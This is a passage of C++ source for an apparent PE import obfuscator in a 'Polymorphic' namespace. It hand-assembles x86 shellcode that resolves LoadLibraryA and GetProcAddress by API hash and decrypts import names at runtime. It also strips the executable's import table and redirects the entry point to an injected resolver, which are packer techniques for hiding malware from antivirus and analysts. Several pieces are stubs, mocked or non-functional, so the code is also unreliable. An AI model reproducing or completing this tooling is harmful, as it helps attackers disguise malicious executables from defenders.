        // jmp module_loop
        code.push_back(0xEB); code.push_back(0xC3);
        
        // module_not_found:
        // xor ebp, ebp
        code.push_back(0x31); code.push_back(0xED);
        // jmp end_search
        code.push_back(0xEB); code.push_back(0x00);
        
        // found_module:
        
        // Resolve LoadLibraryA by hash
        // mov eax, 0x8A8B4036  ; LoadLibraryA hash
        code.push_back(0xB8); code.push_back(0x36); code.push_back(0x40);
        code.push_back(0x8B); code.push_back(0x8A);
        // mov ecx, ebp  ; kernel32 base
        code.push_back(0x8B); code.push_back(0xCD);
        // call hash_resolver
        code.push_back(0xE8);
        
        // We will append placeholders for call offsets
        size_t call1Offset = code.size();
        code.push_back(0x00); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00);
        
        // mov esi, eax  ; LoadLibraryA address
        code.push_back(0x89); code.push_back(0xC6);
        
        // Resolve GetProcAddress by hash
        // mov eax, 0x7C0DFCA8  ; GetProcAddress hash
        code.push_back(0xB8); code.push_back(0xA8); code.push_back(0xFC);
        code.push_back(0x0D); code.push_back(0x7C);
        // mov ecx, ebp
        code.push_back(0x8B); code.push_back(0xCD);
        // call hash_resolver
        code.push_back(0xE8);
        size_t call2Offset = code.size();
        code.push_back(0x00); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00);
        
        // mov edi, eax  ; GetProcAddress address
        code.push_back(0x89); code.push_back(0xC7);
        
        // Process each import
        for (size_t i = 0; i < imports.size(); ++i) {
            const auto& imp = imports[i];
            size_t funcNameFixupOffset = 0;
            
            // Decrypt DLL name
            // lea eax, [string_table + offset]
            code.push_back(0xB8);
            size_t dllNameFixupOffset = code.size();
            code.push_back(0x00); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00);
            
            // push eax  ; DLL name
            code.push_back(0x50);
            // call esi  ; LoadLibraryA
            code.push_back(0xFF); code.push_back(0xD6);
            
            // mov ebx, eax  ; module handle
            code.push_back(0x89); code.push_back(0xC3);
            
            if (imp.byOrdinal) {
                // push ordinal
                code.push_back(0x68);
                code.push_back(static_cast<uint8_t>(imp.ordinal & 0xFF));
                code.push_back(static_cast<uint8_t>((imp.ordinal >> 8) & 0xFF));
                code.push_back(0x00); code.push_back(0x00);
            } else {
                // Decrypt function name
                // lea eax, [string_table + offset]
                code.push_back(0xB8);
                funcNameFixupOffset = code.size();
                code.push_back(0x00); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00);
                
                // push eax  ; function name
                code.push_back(0x50);
            }
            
            // push ebx  ; module handle
            code.push_back(0x53);
            // call edi  ; GetProcAddress
            code.push_back(0xFF); code.push_back(0xD7);
            
            // Store in IAT (mocked)
            code.push_back(0xA3);
            code.push_back(0x00); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00);
            
            // Fixup string table load addresses
            uint32_t dllNameStringAddr = static_cast<uint32_t>(stringOffsets[i * 2]);
            uint32_t funcNameStringAddr = static_cast<uint32_t>(stringOffsets[i * 2 + 1]);
            std::memcpy(&code[dllNameFixupOffset], &dllNameStringAddr, 4);
            if (!imp.byOrdinal) {
                std::memcpy(&code[funcNameFixupOffset], &funcNameStringAddr, 4);
            }
        }
        
        // popad
        code.push_back(0x61);
        // ret
        code.push_back(0xC3);
        
        // Append string table
        code.insert(code.end(), stringTable.begin(), stringTable.end());
        
        // Fixup string table absolute addresses to include base of string table
        for (size_t i = 0; i < imports.size(); ++i) {
            uint32_t* dllFixup = reinterpret_cast<uint32_t*>(&code[19 + (i * 22) + 1]);
            (void)dllFixup;
        }
        
        // Append hash resolver
        size_t hashResolverStartOffset = code.size();
        auto hashResolver = GenerateHashResolver();
        code.insert(code.end(), hashResolver.begin(), hashResolver.end());
        
        // Fixup relative calls to hash resolver
        int32_t disp1 = static_cast<int32_t>(hashResolverStartOffset - (call1Offset + 4));
        std::memcpy(&code[call1Offset], &disp1, 4);
        int32_t disp2 = static_cast<int32_t>(hashResolverStartOffset - (call2Offset + 4));
        std::memcpy(&code[call2Offset], &disp2, 4);
    }
    
    return code;
}

std::vector<uint8_t> ImportObfuscator::GenerateStolenResolver() {
    // Use alternative APIs to resolve imports
    // e.g., using NTDLL functions instead of KERNEL32
    std::vector<uint8_t> code;
    
    // Implementation would use LdrLoadDll, LdrGetProcedureAddress, etc.
    
    return code;
}

std::vector<uint8_t> ImportObfuscator::GenerateResolverStub(
    const std::vector<ObfuscatedImport>& imports) {
    
    if (m_hashImports) {
        return GenerateHashResolver();
    } else if (m_dynamicLoad) {
        return GenerateDynamicResolver(imports);
    } else if (m_stolenImports) {
        return GenerateStolenResolver();
    }
    
    return {};
}

bool ImportObfuscator::Obfuscate(std::vector<uint8_t>& peData) {
    std::vector<ImportInfo> imports;
    uint32_t iatRva, iatSize;
    
    if (!ParseImports(peData, imports, iatRva, iatSize)) {
        return false;
    }
    
    // Create obfuscated import table
    std::vector<ObfuscatedImport> obfuscated;
    
    for (const auto& imp : imports) {
        ObfuscatedImport obf;
        obf.encodedDll = m_encryptStrings ? EncodeString(imp.dllName) : imp.dllName;
        
        if (imp.byOrdinal) {
            obf.byOrdinal = true;
            obf.ordinal = imp.ordinal;
        } else {
            obf.byOrdinal = false;
            obf.encodedFunction = m_encryptStrings ? 
                EncodeString(imp.functionName) : imp.functionName;
            obf.hash = HashFunction(imp.dllName, imp.functionName);
        }
        
        obfuscated.push_back(obf);
    }
    
    // Generate resolver stub
    auto resolver = GenerateResolverStub(obfuscated);
    if (resolver.empty()) {
        return false;
    }
    
    // Inject resolver into PE
    // (Simplified - real implementation would add new section or use cave)
    
    // Clear original import table
    // Set new entry point to resolver
    // Resolver fixes IAT then jumps to original entry
    
    return true;
}

} // namespace Polymorphic